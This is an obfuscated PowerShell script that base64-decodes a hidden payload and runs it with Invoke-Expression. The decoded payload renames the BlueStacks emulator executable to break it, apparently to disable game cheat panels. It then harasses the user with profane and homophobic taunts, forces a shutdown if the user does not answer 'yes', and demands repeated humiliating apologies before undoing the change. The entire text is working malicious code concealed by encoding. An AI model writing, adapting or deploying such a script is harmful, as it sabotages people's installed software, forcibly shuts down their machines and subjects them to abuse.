$payload = 'W0NvbnNvbGVdOjpPdXRwdXRFbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgNCiRob3N0LlVJLlJhd1VJLldpbmRvd1RpdGxlID0gIlBhbmVsRnVja2VyLUBGQUlSeCBDT01NVU5JVFkiDQoNCiR0YXJnZXREaXJzID0gQCgNCiAgICAiQzpcUHJvZ3JhbSBGaWxlc1xCbHVlU3RhY2tzX21zaTUiLA0KICAgICJDOlxQcm9ncmFtIEZpbGVzXEJsdWVTdGFja3Nfbnh0Ig0KKQ0KDQokcmVuYW1lZEZpbGVzID0gQCgpDQokbmV3TmFtZSA9ICJIRC1wbGF5ZXIuZXhlIiAgIyBMb3dlcmNhc2UgJ3AnDQoNCmZvcmVhY2ggKCRkaXIgaW4gJHRhcmdldERpcnMpIHsNCiAgICBpZiAoVGVzdC1QYXRoICRkaXIpIHsNCiAgICAgICAgJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkZGlyIC1SZWN1cnNlIC1GaWx0ZXIgIkhELVBsYXllci5leGUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkbmV3UGF0aCA9IEpvaW4tUGF0aCAkZmlsZS5EaXJlY3RvcnlOYW1lICRuZXdOYW1lDQogICAgICAgICAgICAgICAgUmVuYW1lLUl0ZW0gLVBhdGggJGZpbGUuRnVsbE5hbWUgLU5ld05hbWUgJG5ld05hbWUgLUZvcmNlDQogICAgICAgICAgICAgICAgJHJlbmFtZWRGaWxlcyArPSAkbmV3UGF0aA0KICAgICAgICAgICAgfSBjYXRjaCB7IH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KQ2xlYXItSG9zdA0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiRE8gTk9UIGNsb3NlIHRoaXMgY29uc29sZS4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQpXcml0ZS1Ib3N0ICJJZiB5b3UgbGVhdmUgbm93LCB5b3UgcHJvdmUgdGhhdCB5b3UgYXJlIGdheS4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQpXcml0ZS1Ib3N0ICIiDQpXcml0ZS1Ib3N0ICJIb2xkIHRpZ2h0LCBzb21ldGhpbmcgaXMgY29taW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIERhcmtSZWQNClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDE1DQoNCldyaXRlLUhvc3QgIiINCldyaXRlLUhvc3QgIllvdSBhcmUgZnVja2VkIGtpZGRvLiIgLUZvcmVncm91bmRDb2xvciBSZWQNClN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNzAwDQpXcml0ZS1Ib3N0ICJZb3VyIGJpdGNoYXNzIHBhbmVscyB3b24ndCB3b3JrIGFueW1vcmUsIHlvdSBzb24gb2YgYSBiaXRjaC4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZA0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiVG91Y2hpbmcgdGhpbmdzIHdpdGhvdXQga25vd2luZyB3aGF0IHRoZXkgZG8uLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZA0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KV3JpdGUtSG9zdCAiIg0KU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA3MDANCg0KJHVzZXJDaG9pY2UgPSBSZWFkLUhvc3QgIllvdSB3YW50IGV2ZXJ5dGhpbmcgYmFjayB0byBub3JtYWw/IFR5cGUgeWVzIG9yIG5vIg0KDQppZiAoJHVzZXJDaG9pY2UuVHJpbSgpLlRvTG93ZXIoKSAtbmUgInllcyIpIHsNCiAgICBXcml0ZS1Ib3N0ICJXcm9uZyBjaG9pY2UuIFNheSBnb29kYnllIHRvIHlvdXIgUEMuIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDINCiAgICBTdG9wLUNvbXB1dGVyIC1Gb3JjZQ0KICAgIGV4aXQNCn0NCg0KV3JpdGUtSG9zdCAiIg0KV3JpdGUtSG9zdCAiV2VsbCB3ZWxsIHdlbGwuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpXcml0ZS1Ib3N0ICJCdXQgZG8gbm90IHdvcnJ5LiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNClN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgODAwDQpXcml0ZS1Ib3N0ICJUaGVyZSBpcyBhIHdheSBvdXQuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpXcml0ZS1Ib3N0ICIiDQpXcml0ZS1Ib3N0ICJCdXQgb25seSBpZiB5b3UgYmVnIHByb3Blcmx5LiIgLUZvcmVncm91bmRDb2xvciBNYWdlbnRhDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxLjUNCldyaXRlLUhvc3QgIiINCg0KJHJlcXVpcmVkQXBvbG9naWVzID0gR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtIDYNCiRhcG9sb2d5Q291bnQgPSAwDQoNCndoaWxlICgkYXBvbG9neUNvdW50IC1sdCAkcmVxdWlyZWRBcG9sb2dpZXMpIHsNCiAgICAkaW5wdXQgPSBSZWFkLUhvc3QgLVByb21wdCAoIkF0dGVtcHQgezB9IG9mIHsxfSAtIFR5cGUgZXhhY3RseTogU29ycnkgZGFkZHkiIC1mICgkYXBvbG9neUNvdW50ICsgMSksICRyZXF1aXJlZEFwb2xvZ2llcykNCiAgICBpZiAoJGlucHV0LlRyaW0oKS5Ub0xvd2VyKCkgLWVxICJzb3JyeSBkYWRkeSIpIHsNCiAgICAgICAgJGFwb2xvZ3lDb3VudCsrDQogICAgICAgICR0YXVudHMgPSBAKA0KICAgICAgICAgICAgIlRoYXQgaXMgY3V0ZS4gVHJ5IGhhcmRlci4iLA0KICAgICAgICAgICAgIllvdSBhcmUgbm90IHJlYWxseSBzb3JyeSwgYXJlIHlvdT8iLA0KICAgICAgICAgICAgIkxvdWRlci4gSSBjYW5ub3QgaGVhciB3ZWFrbmVzcy4iLA0KICAgICAgICAgICAgIlNheSBpdCBsaWtlIHlvdSBtZWFuIGl0LiIsDQogICAgICAgICAgICAiS2VlcCBnb2luZy4gQmVnIHByb3Blcmx5LiIsDQogICAgICAgICAgICAiWW91IGFyZSBhbG1vc3QgdGhlcmUuIE1heWJlLiINCiAgICAgICAgKQ0KICAgICAgICBXcml0ZS1Ib3N0ICR0YXVudHNbJGFwb2xvZ3lDb3VudCAlICR0YXVudHMuTGVuZ3RoXSAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5DQogICAgfSBlbHNlIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiV3JvbmcuIFlvdSByZWFsbHkgYXJlIHNsb3csIGh1aD8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgfQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgOTAwDQp9DQoNCiMgUmVzdG9yZSBvcmlnaW5hbCBuYW1lDQpmb3JlYWNoICgkZmlsZSBpbiAkcmVuYW1lZEZpbGVzKSB7DQogICAgdHJ5IHsNCiAgICAgICAgJG9yaWdpbmFsUGF0aCA9IEpvaW4tUGF0aCAoU3BsaXQtUGF0aCAkZmlsZSAtUGFyZW50KSAiSEQtUGxheWVyLmV4ZSINCiAgICAgICAgUmVuYW1lLUl0ZW0gLVBhdGggJGZpbGUgLU5ld05hbWUgIkhELVBsYXllci5leGUiIC1Gb3JjZQ0KICAgIH0gY2F0Y2ggeyB9DQp9DQoNCkNsZWFyLUhvc3QNCldyaXRlLUhvc3QgIlRoYXQgaXMgaXQ/IFRoYXQgaXMgYWxsIGl0IHRvb2sgdG8gYnJlYWsgeW91PyIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDINCldyaXRlLUhvc3QgIlBhdGhldGljLiBCdXQgZmluZS4gWW91IGFyZSBkaXNtaXNzZWQuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpSZWFkLUhvc3QgLVByb21wdCAiUHJlc3MgRW50ZXIgdG8gY3Jhd2wgYXdheSAuIC4gLiINCg==';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
